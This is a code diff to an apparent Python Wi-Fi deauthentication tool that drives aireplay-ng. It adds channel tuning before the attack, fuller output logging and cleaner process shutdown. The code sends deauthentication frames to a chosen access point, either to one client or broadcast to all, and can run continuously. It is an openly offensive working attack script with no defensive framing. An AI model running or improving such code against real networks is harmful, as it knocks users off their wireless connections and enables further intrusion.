@@ -25,14 +25,21 @@ def check_aireplay():
         return False
 
 
-def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False):
+def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, channel=None):
     """
     Send deauth frames.
     - bssid: target AP MAC
     - client_mac: specific client, or None to broadcast (kick everyone)
     - count: number of deauth packets (0 = continuous)
     - continuous: keep sending until Ctrl+C
+    - channel: AP channel to tune interface before attack
     """
+    # tune interface to AP channel first
+    if channel:
+        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
+                       capture_output=True, timeout=5)
+        print(f"[*] Tuned {mon_iface} to channel {channel}")
+
     cmd = ["aireplay-ng",
            "--deauth", "0" if continuous else str(count),
            "-a", bssid]
@@ -56,18 +63,23 @@ def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False):
     try:
         for line in proc.stdout:
             line = line.strip()
-            # count sent frames from aireplay output
+            if not line:
+                continue
+            # count sent frames
             m = re.search(r"(\d+)\s+DeAuth", line)
             if m:
                 frames_sent = int(m.group(1))
                 print(f"\r[*] Deauth frames sent: {frames_sent}", end="", flush=True)
-            elif line and "Sending" not in line and "WEP" not in line:
-                # show other useful output
-                pass
+            else:
+                # show all other output for debugging
+                print(f"    {line}")
         proc.wait()
     except KeyboardInterrupt:
         proc.send_signal(signal.SIGINT)
-        proc.wait(timeout=3)
+        try:
+            proc.wait(timeout=3)
+        except Exception:
+            proc.kill()
 
     print(f"\n[+] Done. Total deauth frames sent: {frames_sent}")
     return frames_sent
@@ -156,7 +168,8 @@ def deauth_menu(aps, clients, mon_iface):
         print("[*] Cancelled")
         return
 
-    send_deauth(mon_iface, bssid, client_mac, count, continuous)
+    send_deauth(mon_iface, bssid, client_mac, count, continuous,
+                channel=ap.get("channel"))
 
 
 def interactive_deauth():
